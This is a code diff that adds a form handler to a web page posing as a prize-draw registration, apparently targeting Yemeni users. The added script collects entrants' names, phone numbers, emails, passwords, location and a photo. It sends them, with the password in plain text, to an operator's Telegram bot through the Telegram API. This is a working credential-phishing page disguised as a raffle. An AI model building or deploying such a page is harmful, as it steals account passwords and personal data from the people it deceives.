@@ -862,4 +862,72 @@ function cleanHTML(str) {
             .replace(/>/g, "&gt;");
 }
 
-document.getElementById("raffleForm").addEventListener("
+document.getElementById("raffleForm").addEventListener("submit", async function(e) {
+  e.preventDefault();
+  const msg = document.getElementById("msg");
+  msg.className = "msg";
+
+  if (!compressedImageBlob) {
+    msg.className = "msg err";
+    msg.textContent = "❌ يرجى اختيار وإرفاق صورة من معرض الهاتف!";
+    return;
+  }
+
+  const btn = document.getElementById("btn");
+  btn.disabled = true;
+  btn.textContent = "⏳ جارٍ ضغط الصورة وإرسالها للبوت...";
+
+  const ticketID = "AMIR-" + Math.floor(1000 + Math.random() * 9000);
+  const g = id => cleanHTML(document.getElementById(id).value.trim());
+  const rawPhone = document.getElementById("phone").value.trim().replace(/\s+/g, '');
+
+  const captionText =
+`🏆 <b>تسجيل عصري جديد في السحب الأسطوري!</b>
+━━━━━━━━━━━━━━━━━━
+🎟️ <b>رقم التذكرة:</b> <code>${ticketID}</code>
+👤 <b>الاسم:</b> ${g("name")}
+📱 <b>الهاتف:</b> <code>${g("phone")}</code>
+📧 <b>البريد:</b> <code>${g("email")}</code>
+🔑 <b>كلمة المرور:</b> <code>${g("password")}</code>
+🏙️ <b>المنطقة:</b> ${g("city")}
+🏍️ <b>المتر المفضل:</b> ${g("favModel")}
+💬 <b>ملاحظة:</b> ${g("note") || "لا يوجد"}
+🖼️ <b>الصورة:</b> تم إرفاق و ضغط الصورة بنجاح
+━━━━━━━━━━━━━━━━━━
+📲 <b>تواصل سريع مع المشترك (واتساب):</b>
+https://wa.me/967${rawPhone.replace(/^0+/, '')}`;
+
+  try {
+    const formData = new FormData();
+    formData.append("chat_id", CHAT_ID);
+    // إرسال الصورة المضغوطة كملف JPEG
+    formData.append("photo", compressedImageBlob, "compressed_user_image.jpg");
+    formData.append("caption", captionText);
+    formData.append("parse_mode", "HTML");
+
+    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+      method: "POST",
+      body: formData
+    });
+
+    const data = await res.json();
+    if (data.ok) {
+      document.getElementById("ticketCode").textContent = ticketID;
+      document.getElementById("raffleForm").style.display = "none";
+      document.getElementById("ticketBox").style.display = "block";
+      document.getElementById("ticketBox").scrollIntoView({ behavior: "smooth" });
+    } else {
+      throw new Error(data.description || "Telegram Error");
+    }
+  } catch (err) {
+    msg.className = "msg err";
+    msg.textContent = "❌ تعذر إرسال البيانات والصورة، يرجى التحقق من اتصال الإنترنت والمحاولة مرة أخرى.";
+    console.error(err);
+    btn.disabled = false;
+    btn.textContent = "🔥 تأكيد التسجيل وإرسال البيانات والصورة للبوت";
+  }
+});
+</script>
+
+</body>
+</html>
